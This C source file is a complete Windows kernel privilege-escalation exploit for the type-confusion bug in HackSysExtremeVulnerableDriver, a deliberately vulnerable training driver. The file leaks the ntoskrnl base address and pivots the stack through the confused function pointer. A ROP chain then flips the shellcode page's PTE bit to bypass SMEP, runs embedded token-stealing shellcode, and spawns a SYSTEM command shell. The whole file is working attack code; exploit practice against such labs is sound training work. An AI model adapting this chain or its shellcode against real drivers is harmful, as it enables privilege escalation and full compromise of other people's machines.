/* wetw0rk */

#include <stdio.h>
#include <stdlib.h>
#include <stdint.h>
#include <string.h>

#include <windows.h>
#include <psapi.h>
#include <ntdef.h>
#include <shlwapi.h>

#define TYPE_CONFUSION 0x222023

/* Structure used by Type Confusion */
typedef struct _USER_TYPE_CONFUSION_OBJECT {
  uint64_t ObjectId;
  uint64_t ObjectType;
} USER_TYPE_CONFUSION_OBJECT, *PUSER_TYPE_CONFUSION_OBJECT;

/* GetKernelModuleBase():
     Function used to obtain kernel module address */
LPVOID GetKernelModuleBase(PCHAR pKernelModule)
{
  char pcDriver[1024]    = { 0 };
  LPVOID lpvTargetDriver = NULL;
  LPVOID *lpvDrivers     = NULL;
  DWORD dwCB             = 0;
  DWORD dwDrivers        = 0;
  DWORD i                = 0;

  EnumDeviceDrivers(NULL, dwCB, &dwCB);
  if (dwCB <= 0)
    return NULL;

  lpvDrivers = (LPVOID *)malloc(dwCB * sizeof(LPVOID));
  if (lpvDrivers == NULL)
    return NULL;

  if (EnumDeviceDrivers(lpvDrivers, dwCB, &dwCB))
  {
    dwDrivers = dwCB / sizeof(LPVOID);
    for (i = 0; i < dwDrivers; i++)
      if (GetDeviceDriverBaseNameA(lpvDrivers[i], pcDriver, sizeof(pcDriver)))
        if (StrStrA(pcDriver, pKernelModule) != NULL)
          lpvTargetDriver = lpvDrivers[i];
  }

  free(lpvDrivers);

  return lpvTargetDriver;
}

/* CheckWin():
     Simple function to check if we're running as SYSTEM */
int CheckWin(VOID)
{
  DWORD win = 0;
  DWORD dwLen = 0;
  CHAR *cUsername = NULL;

  GetUserNameA(NULL, &dwLen);

  if (dwLen > 0) {
    cUsername = (CHAR *)malloc(dwLen * sizeof(CHAR));
  } else {
    printf("[-] Failed to allocate buffer for username check\n");
    return -1;
  }

  GetUserNameA(cUsername, &dwLen);

  win = strcmp(cUsername, "SYSTEM");
  free(cUsername);

  return (win == 0) ? win : -1;
}

void WriteGadgets(LPVOID lpvNt, LPVOID lpvBuffer)
{
  uint64_t *rop = (uint64_t *)(lpvBuffer);
  uint64_t nt = (uint64_t)(lpvNt);

  uint8_t sc[129] = {
  // sickle-tool -p windows/x64/kernel_token_stealer -f num (58 bytes)
  0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x80, 
  0xb8, 0x00, 0x00, 0x00, 0x48, 0x89, 0xc1, 0xb2, 0x04, 0x48, 0x8b, 0x80, 0x48, 0x04, 
  0x00, 0x00, 0x48, 0x2d, 0x48, 0x04, 0x00, 0x00, 0x38, 0x90, 0x40, 0x04, 0x00, 0x00, 
  0x75, 0xeb, 0x48, 0x8b, 0x90, 0xb8, 0x04, 0x00, 0x00, 0x48, 0x89, 0x91, 0xb8, 0x04, 
  0x00, 0x00,
 
  // sickle-tool -p windows/x64/kernel_sysret -f num (71)
  0x65, 0x48, 0xa1, 0x88, 0x01, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x66, 0x8b, 0x88, 
  0xe4, 0x01, 0x00, 0x00, 0x66, 0xff, 0xc1, 0x66, 0x89, 0x88, 0xe4, 0x01, 0x00, 0x00, 
  0x48, 0x8b, 0x90, 0x90, 0x00, 0x00, 0x00, 0x48, 0x8b, 0x8a, 0x68, 0x01, 0x00, 0x00, 
  0x4c, 0x8b, 0x9a, 0x78, 0x01, 0x00, 0x00, 0x48, 0x8b, 0xa2, 0x80, 0x01, 0x00, 0x00, 
  0x48, 0x8b, 0xaa, 0x58, 0x01, 0x00, 0x00, 0x31, 0xc0, 0x0f, 0x01, 0xf8, 0x48, 0x0f, 
  0x07 };

  LPVOID shellcode = VirtualAlloc(NULL, sizeof(sc), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
  RtlCopyMemory(shellcode, sc, 129);

  /* Prepare RDX register for later. This is needed for the XOR operation */
  *rop++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret
  *rop++ =      0x000008; // Set RDX to 0x08, we will need this to accomplish the XOR
  *rop++ =      0x000000; // [filler]
  *rop++ =      0x000000; // [filler]

  /* Setup the call to MiGetPteAddress in order to get the address of the PTE for our
     userland code. The setup is as follows:
         
       RAX -> VOID *MiGetPteAddress(
         ( RCX == PTE / Userland Code )
       );

     Once the call is complete RAX should contain the pointer to our PTE. */
  *rop++ = nt + 0x57699c;       // pop rcx ; ret
  *rop++ = (uint64_t)shellcode; // *shellcode
  *rop++ = nt + 0x24aaec;       // MiGetPteAddress()

  /* Now that we have obtained the PTE address, we can modify the 2nd bit in order to
       mark the page as a kernel page (U -> K). We can do this using XOR ;) */
  *rop++ = nt + 0x30fcf3; // sub rax, rdx ; ret
  *rop++ = nt + 0x54f344; // push rax ; pop rbx ; ret
  *rop++ = nt + 0x40ed4e; // pop rdx ; pop rax ; pop rcx ; ret
  *rop++ =      0x000004; // 0x40ed4e: pop rdx ; pop rax ; pop rcx ; ret ; (1 found)
  *rop++ =      0x000000; // [filler]
  *rop++ =      0x000000; // [filler]
  *rop++ = nt + 0x3788b6; // xor  [rbx+0x08], edx ; mov rbx, qword [rsp+0x60] ; add rsp, 0x40 ; pop r14 ; pop rdi ; pop rbp ; ret

  /* Now we cam spray our shellcode address since SMEP and VPS should be bypassed */
  for (int i = 0; i < 0xC; i++) {
    *rop++ = (uint64_t)shellcode;
  }
}

/* Exploit():
     Type Confusion */
int Exploit(HANDLE hHEVD)
{
  uint64_t *rop = NULL;
  BOOL bBlocked;
  DWORD dwBytesReturned = 0;
  LPVOID lpvNtKrnl = NULL;
  LPVOID lpvAllocation = NULL;
  LPVOID lpvAllocTarget = NULL;
  USER_TYPE_CONFUSION_OBJECT UserTypeConfusionObject = { 0 };

  lpvNtKrnl = GetKernelModuleBase("ntoskrnl");
  if (lpvNtKrnl == NULL)
  {
    printf("[-] Failed to obtain the base address of nt\n");
    return -1;
  }
  printf("[*] Obtained the base address of nt: 0x%p\n", lpvNtKrnl);

  /* Allocate memory one page before the target memory region. This helps prevent
     the Double Fault; Logic here is avoid not triggering "Demand Paging". */
  lpvAllocTarget = (LPVOID)0x48000000;
  printf("[*] Allocation to be made at 0x%p - PAGE_SIZE\n", lpvAllocTarget);
  lpvAllocation = VirtualAlloc((lpvAllocTarget - 0x1000),
                               0x10000,
                               (MEM_COMMIT | MEM_RESERVE),
                               PAGE_READWRITE);
  if (lpvAllocation == NULL)
  {
    printf("[*] Failed to allocate memory\n");
    return -1;
  }
  printf("[*] Successfully created allocation: 0x%p\n", lpvAllocation);

  /* Trigger the Type Confusion by overwriting the function pointer */
  UserTypeConfusionObject.ObjectId = 0x4242424242424242;
  UserTypeConfusionObject.ObjectType = (uint64_t)lpvNtKrnl + 0x28d700; // mov esp, 0x48000000 ; add esp, 0x28 ; ret

  /* Let the Kernel breathe... this is needed to avoid a crash, my thoery is
     if we don't do this the allocation will not be mapped properly. So what
     we need to do is sleep for a few seconds to allow this to happen! First
     time trying this I was under the impression VirtualLock was needed, but
     when testing it never locked? So after debugging I found this to be the
     solution. This exploit succeded 9/10 times vs the original 2/10 ;D */
  printf("[*] Letting the kernel breathe");
  for (int i = 0; i < 4; i++) {
    putchar('.');
    Sleep(1000);
  }
  putchar('\n');

  /* Fill the page before the target region with random data */
  RtlFillMemory(lpvAllocation, 0x1000, 'A');

  /* Write the gadget chain at the location we return */
  WriteGadgets(lpvNtKrnl, (lpvAllocTarget + 0x28));

  printf("[*] Triggering Type Confusion\n");
  DeviceIoControl(hHEVD,
                  TYPE_CONFUSION,
                  &UserTypeConfusionObject,
                  sizeof(UserTypeConfusionObject),
                  NULL,
                  0x00,
                  &dwBytesReturned,
                  NULL);

  return CheckWin();
}

int main()
{
  HANDLE hHEVD = NULL;

  hHEVD = CreateFileA("\\\\.\\HackSysExtremeVulnerableDriver",
                      (GENERIC_READ | GENERIC_WRITE),
                      0x00,
                      NULL,
                      OPEN_EXISTING,
                      FILE_ATTRIBUTE_NORMAL,
                      NULL);

  if (hHEVD == INVALID_HANDLE_VALUE)
  {
    printf("[-] Failed to get a handle on HackSysExtremeVulnerableDriver\n");
    return -1;
  }

  if (Exploit(hHEVD) == 0) {
    printf("[+] Exploitation successful, enjoy the shell!!\n\n");
    system("cmd.exe");
  } else {
    printf("[*] Exploitation failed, run again\n");
  }

  if (hHEVD != NULL)
    CloseHandle(hHEVD);

  return 0;
}
